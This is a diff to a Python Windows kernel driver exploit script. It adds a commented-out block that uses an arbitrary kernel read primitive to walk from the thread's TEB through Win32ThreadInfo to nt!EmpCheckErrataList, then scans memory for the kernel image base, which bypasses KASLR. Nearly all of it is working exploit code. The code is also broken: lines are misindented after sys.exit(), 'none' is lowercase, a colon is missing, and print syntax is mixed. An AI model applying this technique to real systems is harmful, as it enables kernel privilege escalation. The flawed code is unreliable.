@@ -93,6 +93,47 @@ def writeQWORD(driver, what=None, where=None):
     print "Value after: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
     return triggerIOCTL
 
+
+
+
+
+'''
+ThreadHandle = kernel32.GetCurrentThread()
+ThreadInformation = THREAD_BASIC_INFORMATION()
+ThreadInformationClass = ThreadBasicInformation
+ThreadInformationLength = sizeof(ThreadInformation)
+ReturnLength = c_ulonglong(0)
+
+dwStatus = ntdll.NtQueryInformationThread(ThreadHandle, ThreadInformationClass, byref(ThreadInformation), ThreadInformationLength, byref(ReturnLength))
+if dwStatus != STATUS_SUCCESS:
+	print("Something went wrong","e")
+	getLastError()
+	sys.exit()
+
+	teb = ThreadInformation.TebBaseAddress
+Win32ThreadInfo = teb + 0x78
+W32THREADNONPAGED = leakQWORD(Win32ThreadInfo, driver)
+W32THREAD = leakQWORD(W32THREADNONPAGED.value, driver)
+nt_EmpCheckErrataList = leakQWORD(W32THREAD.value + 0x2a8, driver)
+baseAddr = 0
+signature = 0x00905a4d
+searchAddr = nt_EmpCheckErrataList.value & 0xFFFFFFFFFFFFF000
+
+while True: 
+	readData = leakQWORD(searchAddr, driver)
+	tmp = readData.value & 0xFFFFFFFF
+	if tmp == signature: 
+		baseAddr = searchAddr
+		break
+	searchAddr = searchAddr - 0x1000
+
+	print("TEB address is: 0x%x" % teb)
+	print("Win32ThreadInfo address is: 0x%x" % Win32ThreadInfo)
+	print("W32THREADNONPAGED address is: 0x%x" % W32THREADNONPAGED.value)
+	print("W32THREAD address is: 0x%x" % W32THREAD.value)
+	print("nt!EmpCheckErrataList address is: 0x%x" % nt_EmpCheckErrataList.value)
+	return baseAddr
+
 def readWhatWhere(driver=none, what=None, where=None)
 lpBuffer = c_ulonglong()
 result = kernel32.ReadProcessMemory(0xFFFFFFFFFFFFFFFF, 0x000000001a001010, byref(lpBuffer), 0x08, byref(read))
@@ -100,6 +141,13 @@ result = kernel32.ReadProcessMemory(0xFFFFFFFFFFFFFFFF, 0x000000001a001010, byre
 		print("Something went wrong while reading memory","e")
 		sys.exit()
 	return lpBuffer
+
+'''
+
+
+
+
+
 
 # Exploit the driver
 def executeOverwrite():
